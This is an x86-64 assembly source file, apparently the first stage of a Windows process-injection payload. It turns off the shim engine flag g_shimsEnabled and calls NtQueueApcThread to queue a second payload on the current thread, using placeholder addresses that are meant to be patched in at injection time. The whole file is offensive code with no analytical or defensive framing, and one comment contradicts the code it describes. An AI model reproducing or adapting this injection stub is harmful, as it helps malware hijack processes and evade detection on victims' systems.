; nasm -f bin payload1.asm -o payload1.bin ; xxd -i payload1.bin
[BITS 64]
DEFAULT REL

    push rax
    push rcx
    push rdx
    push r8
    push r9


    ; Set g_shimsEnabled to 1
    mov rax, [rel pg_shimsEnabled]
    mov byte [rax], 0
    ; Once shims is disabled we register payload2 in the APC queue
    
    ; Save shaodw space 
    sub rsp, 0x28

    ; Reminder ABI : rcx, rdx, r8, r9  SSN : rax
    ; NtQueueApcThread(ThreadHandle, ApcRoutine, Context, Status, Reserved)
    mov rcx, 0xFFFFFFFFFFFFFFFE             ; Target thread to queue the APC routine (here self thread -2)
    mov rdx, [rel pPayload2]                ; Routine address our second payload
    xor r8, r8                              ; ApcContext = NULL
    xor r9, r9                              ; ApcStatusBlock = NULL

    mov rax, 0                              ; ApcReserved = NULL
    mov [rsp + 0x20], rax                   ; 0x20 is right above the 32-byte shadow space

    mov rax, [rel pNtQueueApcThread]
    call rax

    add rsp, 0x28

    pop r9
    pop r8
    pop rdx
    pop rcx
    pop rax

    ret

pg_shimsEnabled:
    dq 0xAAAAAAAAAAAAAAAA
pPayload2:
    dq 0xBBBBBBBBBBBBBBBB
pNtQueueApcThread:
    dq 0xCCCCCCCCCCCCCCCC



    


    
